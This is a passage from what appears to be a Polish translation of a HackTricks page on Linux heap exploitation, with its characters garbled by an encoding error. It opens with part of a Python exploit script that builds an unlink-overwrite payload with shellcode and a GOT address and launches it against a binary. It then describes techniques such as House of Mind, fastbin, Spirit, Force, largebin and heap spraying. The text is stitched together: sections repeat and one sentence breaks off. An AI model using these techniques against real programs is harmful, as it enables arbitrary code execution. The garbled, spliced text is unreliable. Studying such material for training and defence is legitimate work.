**addr\_sc = pack("\<I", 0x0804a008 + 8) #En el payload al principio le vamos a poner 8bytes de relleno**

**got\_free = pack("\<I", 0x08048300 - 12) #DirecciÃ³n de free() en la plt-12 (serÃ¡ la direcciÃ³n que se sobrescrita para que se lanza la shellcode la 2Âº vez que se llame a free)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) # Como se dijo el payload comienza con 8 bytes de relleno porque sÃ­**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #Se modifica el 2Âº trozo, el got\_free apunta a donde vamos a guardar la direccion addr\_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() liberando en sentido inverso (wargame)**

Kontrolujemy 3 kolejne chunki i sÄ… one zwalniane w odwrotnej kolejnoÅ›ci do ich rezerwacji.

W tym przypadku:

W chunku c umieszczamy shellcode

Chunk a uÅ¼ywamy do nadpisania b w taki sposÃ³b, Å¼eby bit PREV_INUSE w polu size byÅ‚ wyÅ‚Ä…czony, co sprawia, Å¼e chunk a jest uwaÅ¼any za wolny.

Dodatkowo, nadpisujemy w nagÅ‚Ã³wku b pole size, aby miaÅ‚o wartoÅ›Ä‡ -4.

W ten sposÃ³b program bÄ™dzie myÅ›laÅ‚, Å¼e "a" jest wolne i znajduje siÄ™ w binie, wiÄ™c wywoÅ‚a unlink(), aby go odÅ‚Ä…czyÄ‡. JednakÅ¼e, poniewaÅ¼ nagÅ‚Ã³wek PREV_SIZE ma wartoÅ›Ä‡ -4, program bÄ™dzie myÅ›laÅ‚, Å¼e chunk "a" zaczyna siÄ™ wÅ‚aÅ›nie od b+4. Innymi sÅ‚owy, wywoÅ‚a unlink() na chunku, ktÃ³ry zaczyna siÄ™ od b+4, wiÄ™c na b+12 bÄ™dzie wskaÅºnik "fd", a na b+16 bÄ™dzie wskaÅºnik "bk".

W ten sposÃ³b, jeÅ›li w bk umieÅ›cimy adres shellcode, a w fd umieÅ›cimy adres funkcji "puts()"-12, mamy nasz payload.

**Technika Frontlink**

Frontlink jest wywoÅ‚ywany, gdy coÅ› jest zwalniane i Å¼aden z sÄ…siednich chunkÃ³w nie jest wolny, wtedy nie jest wywoÅ‚ywane unlink(), tylko bezpoÅ›rednio frontlink().

To przydatna podatnoÅ›Ä‡, gdy malloc, ktÃ³ry jest atakowany, nigdy nie jest zwalniany (free()).

Wymaga:

Bufora, ktÃ³ry moÅ¼e byÄ‡ przepeÅ‚niony za pomocÄ… funkcji wprowadzania danych

Bufora sÄ…siadujÄ…cego z nim, ktÃ³ry musi zostaÄ‡ zwolniony i ktÃ³rego pole fd w nagÅ‚Ã³wku zostanie zmodyfikowane dziÄ™ki przepeÅ‚nieniu poprzedniego bufora

Bufora do zwolnienia o rozmiarze wiÄ™kszym niÅ¼ 512, ale mniejszym niÅ¼ poprzedni bufor

Bufora zadeklarowanego przed krokiem 3, ktÃ³ry pozwala na nadpisanie prev_size tego bufora

W ten sposÃ³b, poprzez nadpisanie dwÃ³ch mallocÃ³w w sposÃ³b niekontrolowany i jednego w sposÃ³b kontrolowany, ale tylko zwalnianego jednego, moÅ¼emy przeprowadziÄ‡ exploit.

**PodatnoÅ›Ä‡ double free()**

JeÅ›li free() jest wywoÅ‚ywane dwa razy z tym samym wskaÅºnikiem, powstajÄ… dwa biny wskazujÄ…ce na ten sam adres.

JeÅ›li chcemy ponownie uÅ¼yÄ‡ jednego z nich, zostanie on przypisany bez problemÃ³w. JeÅ›li chcemy uÅ¼yÄ‡ innego, zostanie mu przypisana ta sama przestrzeÅ„, wiÄ™c bÄ™dziemy mieli sfaÅ‚szowane wskaÅºniki "fd" i "bk" z danymi, ktÃ³re zostanÄ… zapisane przez poprzedniÄ… rezerwacjÄ™.

**After free()**

WczeÅ›niej zwolniony wskaÅºnik jest ponownie uÅ¼ywany bez kontroli.

## **8 PrzepeÅ‚nienia sterty: Zaawansowane exploitacje**

Techniki Unlink() i FrontLink() zostaÅ‚y usuniÄ™te przez zmodyfikowanie funkcji unlink().

**The house of mind**

Wystarczy jedno wywoÅ‚anie free(), aby spowodowaÄ‡ wykonanie dowolnego kodu. Interesuje nas znalezienie drugiego chunka, ktÃ³ry moÅ¼e zostaÄ‡ przepeÅ‚niony przez poprzedni i zwolniony.

WywoÅ‚anie free() powoduje wywoÅ‚anie public_fREe(mem), ktÃ³re wykonuje:

mstate ar_ptr;

mchunkptr p;

â€¦

p = mem2chunk(mes); â€”> Zwraca wskaÅºnik na adres, od ktÃ³rego zaczyna siÄ™ chunk (mem-8)

â€¦

ar_ptr = arena_for_chunk(p); â€”> chunk_non_main_arena(ptr)?heap_for_ptr(ptr)->ar_ptr:&main_arena [1]

â€¦

_int_free(ar_ptr, mem);

}

W [1] sprawdzane jest pole size i bit NON_MAIN_ARENA, ktÃ³re moÅ¼na zmieniÄ‡, aby sprawdzenie zwrÃ³ciÅ‚o true i wywoÅ‚aÅ‚o heap_for_ptr(), ktÃ³re wykonuje operacjÄ™ and na "mem", ustawiajÄ…c na 0 najmniej znaczÄ…ce 2,5 bajta (w naszym przypadku z 0x0804a000 zostaje 0x08000000) i uzyskuje dostÄ™p do 0x08000000->ar_ptr (jakby to byÅ‚ struct heap_info).

W ten sposÃ³b, jeÅ›li moÅ¼emy kontrolowaÄ‡ chunk na przykÅ‚ad w 0x0804a000, a chunk w **0x081002a0** ma zostaÄ‡ zwolniony, moÅ¼emy dotrzeÄ‡ do adresu 0x08100000 i zapisaÄ‡ tam dowolne dane, na przykÅ‚ad **0x0804a000**. Gdy ten drugi chunk zostanie zwolniony, okaÅ¼e siÄ™, Å¼e heap_for_ptr(ptr)->ar_ptr zwraca to, co zapisaliÅ›my w 0x08100000 (poniewaÅ¼ jest stosowane and do 0x081002a0, ktÃ³re widzieliÅ›my wczeÅ›niej, i stamtÄ…d pobierana jest wartoÅ›Ä‡ pierwszych 4 bajtÃ³w, ar_ptr)

W ten sposÃ³b wywoÅ‚ywane jest \_int\_free(ar_ptr, mem), czyli **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void_t\* mem){**\
â€¦\
bck = unsorted_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Jak widzieliÅ›my wczeÅ›niej, moÅ¼emy kontrolowaÄ‡ wartoÅ›Ä‡ av, poniewaÅ¼ jest to to, co piszemy w zwalnianym chunku.

Tak jak jest zdefiniowane unsorted_chunks, wiemy, Å¼e:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

Dlatego jeÅ›li w av->bins\[2] zapiszemy wartoÅ›Ä‡ \_\_DTOR\_END\_\_-12, w ostatniej instrukcji zostanie zapisane w \_\_DTOR\_END\_\_ adres drugiego chunka
Ta technika nie jest juÅ¼ stosowana, poniewaÅ¼ zastosowano prawie ten sam patch co dla unlink. Sprawdza siÄ™, czy nowa lokalizacja, do ktÃ³rej siÄ™ odwoÅ‚uje, rÃ³wnieÅ¼ odwoÅ‚uje siÄ™ do niego.

**Fastbin**

Jest to wariant The house of mind.

Interesuje nas wykonanie nastÄ™pujÄ…cego kodu, ktÃ³ry jest osiÄ…gany po pierwszej weryfikacji funkcji \_int\_free()

fb = &(av->fastbins\[fastbin\_index(size)] â€”> fastbin\_index(sz) â€”> (sz >> 3) - 2

â€¦

p->fd = \*fb

\*fb = p

W ten sposÃ³b, jeÅ›li wpiszemy "fb", otrzymamy adres funkcji w GOT, na tym adresie zostanie umieszczony adres nadpisanego fragmentu. Aby to osiÄ…gnÄ…Ä‡, arena musi znajdowaÄ‡ siÄ™ blisko adresÃ³w dtors. DokÅ‚adniej mÃ³wiÄ…c, av->max\_fast musi znajdowaÄ‡ siÄ™ pod adresem, ktÃ³ry zamierzamy nadpisaÄ‡.

PoniewaÅ¼ w The House of Mind zauwaÅ¼ono, Å¼e kontrolujemy pozycjÄ™ av.

JeÅ›li wiÄ™c w polu size podamy rozmiar 8 + NON\_MAIN\_ARENA + PREV\_INUSE â€”> fastbin\_index() zwrÃ³ci fastbins\[-1\], ktÃ³ry wskazuje na av->max\_fast

W tym przypadku av->max\_fast bÄ™dzie adresem, ktÃ³ry zostanie nadpisany (nie wskazuje na niego, ale ta pozycja zostanie nadpisana).

Ponadto, fragment sÄ…siadujÄ…cy z uwolnionym fragmentem musi byÄ‡ wiÄ™kszy niÅ¼ 8 -> PoniewaÅ¼ powiedzieliÅ›my, Å¼e rozmiar uwolnionego fragmentu wynosi 8, w tym faÅ‚szywym fragmencie musimy po prostu umieÅ›ciÄ‡ rozmiar wiÄ™kszy niÅ¼ 8 (poniewaÅ¼ shellcode zostanie umieszczony w uwolnionym fragmencie, na poczÄ…tku trzeba umieÅ›ciÄ‡ skok, ktÃ³ry wpadnie w nops).

Ponadto, ten sam faÅ‚szywy fragment musi byÄ‡ mniejszy niÅ¼ av->system\_mem. av->system\_mem znajduje siÄ™ 1848 bajtÃ³w dalej.

Ze wzglÄ™du na zera z \_DTOR\_END\_ i niewiele adresÃ³w w GOT, Å¼aden z tych adresÃ³w sekcji nie nadaje siÄ™ do nadpisania, wiÄ™c zobaczmy, jak zastosowaÄ‡ fastbin do ataku na stos.

Innym sposobem ataku jest przekierowanie **av** na stos.

JeÅ›li zmienimy rozmiar na 16 zamiast 8, wtedy: fastbin\_index() zwrÃ³ci fastbins\[0\] i moÅ¼emy z tego skorzystaÄ‡, aby nadpisaÄ‡ stos.

W tym celu na stosie nie powinno byÄ‡ Å¼adnych canary ani dziwnych wartoÅ›ci, faktycznie musimy byÄ‡ w takim ukÅ‚adzie: 4 bajty zerowe + EBP + RET

4 bajty zerowe sÄ… potrzebne, aby **av** byÅ‚o na tym adresie, a pierwszy element **av** to mutex, ktÃ³ry musi wynosiÄ‡ 0.

**av->max\_fast** bÄ™dzie EBP i bÄ™dzie wartoÅ›ciÄ…, ktÃ³ra pozwoli nam ominÄ…Ä‡ ograniczenia.

W **av->fastbins\[0\]** zostanie nadpisany adresem **p** i bÄ™dzie to RET, co spowoduje skok do shellcode.

Ponadto, w **av->system\_mem** (1484 bajty powyÅ¼ej pozycji na stosie) bÄ™dzie duÅ¼o Å›mieci, ktÃ³re pozwolÄ… nam ominÄ…Ä‡ sprawdzanie.

Ponadto, fragment sÄ…siadujÄ…cy z uwolnionym fragmentem musi byÄ‡ wiÄ™kszy niÅ¼ 8 -> PoniewaÅ¼ powiedzieliÅ›my, Å¼e rozmiar uwolnionego fragmentu wynosi 16, w tym faÅ‚szywym fragmencie musimy po prostu umieÅ›ciÄ‡ rozmiar wiÄ™kszy niÅ¼ 8 (poniewaÅ¼ shellcode zostanie umieszczony w uwolnionym fragmencie, na poczÄ…tku trzeba umieÅ›ciÄ‡ skok, ktÃ³ry wpadnie w nops, ktÃ³re znajdujÄ… siÄ™ po polu size nowego faÅ‚szywego fragmentu).

**The House of Spirit**

W tym przypadku szukamy wskaÅºnika na malloc, ktÃ³ry moÅ¼e byÄ‡ zmieniony przez atakujÄ…cego (np. wskaÅºnik znajduje siÄ™ na stosie podczas moÅ¼liwego przepeÅ‚nienia zmiennej).

W ten sposÃ³b moÅ¼emy sprawiÄ‡, Å¼e ten wskaÅºnik wskazuje gdziekolwiek. Jednak nie kaÅ¼de miejsce jest waÅ¼ne, rozmiar faÅ‚szywego fragmentu musi byÄ‡ mniejszy niÅ¼ av->max\_fast i bardziej szczegÃ³Å‚owo rÃ³wny rozmiarowi Å¼Ä…danemu w przyszÅ‚ym wywoÅ‚aniu malloc()+8. Dlatego, jeÅ›li wiemy, Å¼e po tym podatnym wskaÅºniku nastÄ™puje wywoÅ‚anie malloc(40), rozmiar faÅ‚szywego fragmentu musi wynosiÄ‡ 48.

Na przykÅ‚ad, jeÅ›li program pyta uÅ¼ytkownika o liczbÄ™, moÅ¼emy wprowadziÄ‡ 48 i skierowaÄ‡ modyfikowalny wskaÅºnik malloc na nastÄ™pne 4 bajty (ktÃ³re mogÄ… naleÅ¼eÄ‡ do EBP, jeÅ›li mamy szczÄ™Å›cie, w ten sposÃ³b 48 zostaje z tyÅ‚u, jakby to byÅ‚a nagÅ‚Ã³wka size). Ponadto, adres ptr-4+48 musi speÅ‚niaÄ‡ kilka warunkÃ³w (w tym przypadku ptr=EBP), to znaczy, 8 < ptr-4+48 < av->system\_mem.

JeÅ›li to jest speÅ‚nione, gdy zostanie wywoÅ‚ane kolejne malloc, ktÃ³re powiedzieliÅ›my, Å¼e jest malloc(40), zostanie mu przypisany adres EBP. JeÅ›li atakujÄ…cy moÅ¼e rÃ³wnieÅ¼ kontrolowaÄ‡ to, co jest zapisywane w tym malloc, moÅ¼e nadpisaÄ‡ zarÃ³wno EBP, jak i EIP dowolnym adresem.

MyÅ›lÄ™, Å¼e jest to dlatego, Å¼e kiedy zostanie zwolnione free(), zostanie zapisane, Å¼e w miejscu, ktÃ³re wskazuje EBP na stosie, znajduje siÄ™ fragment o idealnym rozmiarze dla nowego malloc(), ktÃ³ry chce zarezerwowaÄ‡, wiÄ™c przypisuje mu ten adres.

**The House of Force**

Wymagane jest:

* PrzepeÅ‚nienie fragmentu, ktÃ³re umoÅ¼liwia nadpisanie wilderness
* WywoÅ‚anie malloc() z rozmiarem zdefiniowanym przez uÅ¼ytkownika
* WywoÅ‚anie malloc(), ktÃ³rych dane mogÄ… byÄ‡ zdefiniowane przez uÅ¼ytkownika

PierwszÄ… rzeczÄ…, jakÄ… robimy, jest nadpisanie rozmiaru fragmentu wilderness bardzo duÅ¼Ä… wartoÅ›ciÄ… (0xffffffff), dziÄ™ki czemu kaÅ¼de Å¼Ä…danie pamiÄ™ci wystarczajÄ…co duÅ¼e bÄ™dzie obsÅ‚ugiwane w \_int\_malloc() bez koniecznoÅ›ci rozszerzania sterty.

DrugÄ… rzeczÄ… jest zmiana av->top, aby wskazywaÅ‚ na obszar pamiÄ™ci kontrolowany przez atakujÄ…cego, tak jak stos. W av->top umieszczamy \&EIP - 8.

Musimy nadpisaÄ‡ av->top, aby wskazywaÅ‚ na obszar pamiÄ™ci kontrolowany przez atakujÄ…cego:

victim = av->top;

remainder = chunck\_at\_offset(victim, nb);

av->top = remainder;

Victim przechwytuje wartoÅ›Ä‡ adresu bieÅ¼Ä…cego fragmentu wilderness (aktualne av->top), a remainder to dokÅ‚adnie suma tego adresu plus liczba bajtÃ³w Å¼Ä…danych przez malloc(). Dlatego jeÅ›li \&EIP-8 znajduje siÄ™ w 0xbffff224, a av->top zawiera 0x080c2788, to iloÅ›Ä‡, ktÃ³rÄ… musimy zarezerwowaÄ‡ w kontrolowanym mallocu, aby av->top wskazywaÅ‚ na $EIP-8 dla nastÄ™pnego malloc(), wynosi:

0xbffff224 - 0x080c2788 = 3086207644.

W ten sposÃ³b
## Wprowadzenie

W tym rozdziale omÃ³wione zostanÄ… podstawowe techniki wykorzystywane przy atakach na systemy Linux. Przedstawione zostanÄ… dwie metody eksploatacji: nadpisywanie sterty (heap) oraz manipulacja duÅ¼ymi blokami (LargeBin). Opisane zostanÄ… rÃ³wnieÅ¼ techniki heap spraying oraz heap feng shui. Na koÅ„cu znajduje siÄ™ lista przydatnych poleceÅ„ i odnoÅ›niki do dodatkowych materiaÅ‚Ã³w.

## Nadpisywanie sterty (Heap Overflow)

W tej technice wykorzystuje siÄ™ dwie alokacje pamiÄ™ci przy uÅ¼yciu funkcji `malloc`. Pierwsza alokacja jest mniejsza od drugiej, tak aby moÅ¼na byÅ‚o nadpisaÄ‡ pierwszy blok po zwolnieniu drugiego bloku i umieszczeniu go w odpowiednim binie. NastÄ™pnie, poprzez nadpisanie wskaÅºnika `bk` w drugim bloku, moÅ¼na oszukaÄ‡ bin i spowodowaÄ‡, Å¼e uwierzy, iÅ¼ nastÄ™pny blok na liÅ›cie znajduje siÄ™ pod faÅ‚szywym adresem. W ten sposÃ³b, przy kolejnej alokacji, atakujÄ…cy otrzyma blok o poÅ¼Ä…danym adresie, na ktÃ³rym bÄ™dzie mÃ³gÅ‚ zapisywaÄ‡ dane.

Aby wykorzystaÄ‡ tÄ™ podatnoÅ›Ä‡, naleÅ¼y wykonaÄ‡ nastÄ™pujÄ…ce kroki:
1. ZaalokowaÄ‡ podatny blok.
2. ZaalokowaÄ‡ blok, ktÃ³ry zostanie zmodyfikowany.
3. ZwolniÄ‡ drugi blok.
4. ZaalokowaÄ‡ blok wiÄ™kszy od zwolnionego, aby ten ostatni trafiÅ‚ do odpowiedniego bina.
5. WykorzystaÄ‡ nadpisanie wskaÅºnika `bk` w drugim bloku, aby wskazywaÅ‚ na poÅ¼Ä…dany adres.
6. PoczekaÄ‡, aÅ¼ bin zostanie uÅ¼yty wystarczajÄ…cÄ… iloÅ›Ä‡ razy, aby uwierzyÅ‚, Å¼e nastÄ™pny blok znajduje siÄ™ pod faÅ‚szywym adresem.
7. OtrzymaÄ‡ poÅ¼Ä…dany blok.

Aby zabezpieczyÄ‡ siÄ™ przed tym atakiem, moÅ¼na zastosowaÄ‡ standardowÄ… metodÄ™ sprawdzania, czy blok nie jest faÅ‚szywy. Sprawdza siÄ™, czy wskaÅºnik `bck->fd` wskazuje na prawdziwy blok. AtakujÄ…cy musiaÅ‚by byÄ‡ w stanie w jakiÅ› sposÃ³b zapisaÄ‡ odpowiedni adres (prawdopodobnie na stosie) w miejscu wskazywanym przez faÅ‚szywy blok, aby wydawaÅ‚ siÄ™ on prawdziwy.

## Manipulacja duÅ¼ymi blokami (LargeBin Corruption)

W tej technice rÃ³wnieÅ¼ wykorzystuje siÄ™ nadpisywanie wskaÅºnika `bk`, ale dodatkowo trzeba zmodyfikowaÄ‡ rozmiar bloku tak, aby rÃ³Å¼nica miÄ™dzy rozmiarem a `nb` byÅ‚a mniejsza od `MINSIZE`. Na przykÅ‚ad, jeÅ›li ustawimy rozmiar na 1552, to 1552 - 1544 = 8 < `MINSIZE` (rÃ³Å¼nica nie moÅ¼e byÄ‡ ujemna, poniewaÅ¼ porÃ³wnywane sÄ… liczby bez znaku).

Dodatkowo, wprowadzono Å‚atkÄ™, aby utrudniÄ‡ atakujÄ…cemu wykonanie tego ataku.

## Heap Spraying

Ta technika polega na zarezerwowaniu jak najwiÄ™kszej iloÅ›ci pamiÄ™ci dla sterty i wypeÅ‚nieniu jej poduszkÄ… z instrukcjami `nop`, zakoÅ„czonÄ… kodem powÅ‚oki (shellcode). Jako poduszki uÅ¼ywa siÄ™ wartoÅ›ci `0x0c`. NastÄ™pnie, prÃ³buje siÄ™ skoczyÄ‡ do adresu `0x0c0c0c0c`, aby w przypadku nadpisania jakiegoÅ› wskaÅºnika i skoku na tÄ™ wartoÅ›Ä‡, program wykonaÅ‚ kod powÅ‚oki. PodstawowÄ… taktykÄ… jest zarezerwowanie jak najwiÄ™kszej iloÅ›ci pamiÄ™ci, aby sprawdziÄ‡, czy ktÃ³ryÅ› wskaÅºnik zostanie nadpisany, a nastÄ™pnie skoczyÄ‡ do `0x0c0c0c0c`, zakÅ‚adajÄ…c, Å¼e tam znajdujÄ… siÄ™ instrukcje `nop`.

## Heap Feng Shui

Ta technika polega na rezerwacji i zwalnianiu pamiÄ™ci w taki sposÃ³b, aby miÄ™dzy wolnymi blokami pozostawaÅ‚y zarezerwowane bloki. Bufor, ktÃ³ry zostanie nadpisany, zostanie umieszczony w jednym z tych blokÃ³w.

## Przydatne polecenia

* `objdump -d executable` - wyÅ›wietla rozkÅ‚ady funkcji
* `objdump -d ./PROGRAMA | grep FUNCTION` - pobiera adres funkcji
* `objdump -d -Mintel ./shellcodeout` - wyÅ›wietla kod asemblera i opcode'y
* `objdump -t ./exec | grep varBss` - wyÅ›wietla adresy zmiennych i funkcji
* `objdump -TR ./exec | grep exit(func lib)` - wyÅ›wietla adresy funkcji bibliotecznych (GOT)
* `objdump -d ./exec | grep funcCode`
* `objdump -s -j .dtors /exec`
* `objdump -s -j .got ./exec`
* `objdump -t --dynamic-relo ./exec | grep puts` - wyÅ›wietla adres funkcji `puts` do nadpisania w GOT
* `objdump -D ./exec` - wyÅ›wietla kod asemblera do wpisÃ³w w PLT
* `objdump -p -/exec`
* `Info functions strncmp` - informacje o funkcji w gdb

## Ciekawe kursy

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)

## **OdnoÅ›niki**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ **reklamÄ™ swojej firmy w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi trikami hakerskimi, przesyÅ‚ajÄ…c PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
